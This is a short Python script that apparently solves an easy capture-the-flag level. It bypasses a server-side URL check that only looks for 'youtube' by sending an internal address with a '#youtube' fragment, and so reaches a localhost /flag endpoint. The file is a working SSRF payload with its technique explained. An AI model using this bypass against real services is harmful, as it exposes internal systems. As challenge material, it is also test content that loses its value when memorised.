#!/usr/bin/env python3
"""Easy: only the global "URL must contain youtube" gate, no SSRF filter.

Point straight at the internal flag and satisfy the gate with a #youtube marker
(the fragment is never sent to the server, so the request still hits /flag).
"""
import sys
from exploit import leak, report

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5001"
report(leak(BASE, "http://127.0.0.1:9000/flag#youtube"))
